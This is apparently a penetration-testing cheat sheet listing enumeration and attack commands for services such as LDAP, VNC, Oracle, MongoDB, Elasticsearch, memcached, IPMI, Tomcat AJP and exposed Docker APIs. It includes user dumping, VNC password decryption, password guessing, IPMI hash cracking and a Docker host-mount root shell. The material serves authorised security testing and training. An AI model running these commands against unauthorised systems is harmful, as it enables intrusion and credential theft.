# Less common services

Banner/version first; many of these are open by default. Nothing here is a finding until data or execution is shown.

## LDAP: 389, 636, 3268
```bash
nmap -Pn -p389 --script ldap-rootdse <IP>
ldapsearch -x -H ldap://<IP> -s base namingContexts
ldapsearch -x -H ldap://<IP> -b '<BASE-DN>' '(objectClass=*)'
ldapsearch -x -H ldap://<IP> -D '<USER>@<DOMAIN.TLD>' -w '<PW>' -b '<BASE-DN>' '(objectClass=user)' sAMAccountName description
ldapsearch -x -H ldap://<IP> -D '<USER>@<DOMAIN.TLD>' -w '<PW>' -b '<BASE-DN>' -E pr=1000/noprompt '(&(objectCategory=person)(objectClass=user))' sAMAccountName \
  | awk '/^sAMAccountName: /{print $2}' | sort -u > users.txt
```
- AD returns max 1000 entries per search: keep `-E pr=1000/noprompt` (paging) for the user list. `sAMAccountName::` = base64 value, awk skips it.
- `-x` = simple bind; no `-D`/`-w` = anonymous. A rootDSE answer does not mean anonymous search works.
- Non-AD LDAP (OpenLDAP): `userPassword` values may be base64 hashes. AD follow-up: [ad/ldap-and-sessions](../ad/ldap-and-sessions.md).

## Kerberos: 88
Marks a domain controller → [AD enumeration](../ad/active-directory-enum.md). Username check: `kerbrute userenum`.

## VNC: 5900+
```bash
nmap -Pn -p5900 --script vnc-info,vnc-title <IP>
vncviewer <IP>::5900
```
- "None" security type = no password. Otherwise a password only (no username).
- Stored password file (`~/.vnc/passwd`, registry `Password` value) is DES with a fixed key:
```bash
echo -n '<HEX>' | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv
```
- OpenSSL 3 may need `-provider legacy -provider default`.

## Oracle TNS: 1521
```bash
nmap -Pn -sV -p1521 <IP>
sqlplus '<USER>/<PW>@<IP>:1521/<SID>'
```
```sql
SELECT * FROM v$version;
SELECT * FROM session_privs;
SELECT table_name FROM all_tables;
```
- SID/service name guessing and default accounts: `odat sidguesser -s <IP>`, `odat passwordguesser -s <IP> -d <SID>` (check `odat <module> -h`).
- No `sqlplus` on Kali: install Oracle Instant Client (basic + sqlplus), or query through `odat`.

## MongoDB: 27017
```bash
nmap -Pn -p27017 --script mongodb-info <IP>
mongosh --host <IP> --port 27017
```
```javascript
show dbs
use <DB>
show collections
db.<COLLECTION>.find().limit(5)
```
- `Authentication failed` / `requires authentication` → credentials needed. Older client: `mongo`.

## Elasticsearch: 9200
```bash
curl -s http://<IP>:9200/
curl -s 'http://<IP>:9200/_cat/indices?v'
curl -s 'http://<IP>:9200/<INDEX>/_search?pretty&size=5'
curl -s 'http://<IP>:9200/_search?q=password&pretty'
```
- Version in the root response → [public exploits](../foothold/public-exploits.md). `401` → security enabled, try found creds.

## memcached: 11211
```bash
nc -nv <IP> 11211
```
```text
stats items
stats cachedump <SLAB-ID> 20
get <KEY>
quit
```
- Slab ID comes from `stats items` (`items:<ID>:number`).

## IPMI: 623/UDP
```bash
sudo nmap -Pn -sU -p623 --script ipmi-version <IP>
ipmitool -I lanplus -H <IP> -U <USER> -P '<PW>' user list
```
- IPMI 2.0 RAKP leaks a salted hash for a valid username → `hashcat -m 7300`. Needs a tool that requests it (nmap `ipmi-cipher-zero` only checks the cipher-zero flaw).

## AJP: 8009 (Tomcat)
- Tomcat < 9.0.31 / 8.5.51 / 7.0.100: Ghostcat (CVE-2020-1938) reads webapp files, e.g. `WEB-INF/web.xml`. Public PoC: `searchsploit ghostcat`. Patched/`secret` set → no.
- Web side of Tomcat: [cms-and-apps](../web/cms-and-apps.md#tomcat).

## Docker API: 2375 (2376 TLS)
```bash
curl -s http://<IP>:2375/version
docker -H tcp://<IP>:2375 ps -a
docker -H tcp://<IP>:2375 run -v /:/mnt --rm -it alpine chroot /mnt sh
```
- Container shell with the host mounted = root on that host (needs an image the host already has or can pull: `docker -H ... images`).
